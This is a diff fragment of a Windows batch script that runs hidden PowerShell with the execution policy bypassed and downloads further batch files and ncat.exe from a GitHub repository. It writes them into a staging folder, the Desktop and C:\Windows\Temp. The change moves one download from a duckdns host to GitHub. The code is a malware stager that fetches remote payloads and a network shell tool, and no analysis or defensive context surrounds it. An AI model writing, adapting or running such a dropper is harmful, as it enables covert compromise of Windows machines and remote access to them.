@@ -15,7 +15,7 @@ timeout /t 2 >nul
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
 Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/wait_R.bat/" -OutFile "C:\Users\%USERNAME%\Project\Roll\Staging\wait_R.bat" > $null
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
-Invoke-WebRequest -Uri "http://shadingfile.duckdns.org/media/clean.bat" -OutFile "C:\Users\%USERNAME%\Desktop\clean.bat" > $null
+Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/clean.bat" -OutFile "C:\Users\%USERNAME%\Desktop\clean.bat" > $null
 timeout /t 2 >nul
 powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ^
 Invoke-WebRequest -Uri "https://github.com/Ax0my10rk/A/raw/refs/heads/main/ncat.exe" -OutFile "C:\Windows\Temp\ncat.exe" > $null
